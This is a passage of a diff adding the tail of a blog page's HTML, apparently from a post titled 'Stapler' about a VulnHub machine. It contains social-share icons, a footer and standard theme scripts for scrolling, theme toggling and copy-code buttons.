+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Stapler on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fstapler%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Stapler on whatsapp"
+        href="https://api.whatsapp.com/send?text=Stapler%20-%20https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fstapler%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Stapler on telegram"
+        href="https://telegram.me/share/url?text=Stapler&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fstapler%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://suszczyk.github.io">Mateusz Suszczyk</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
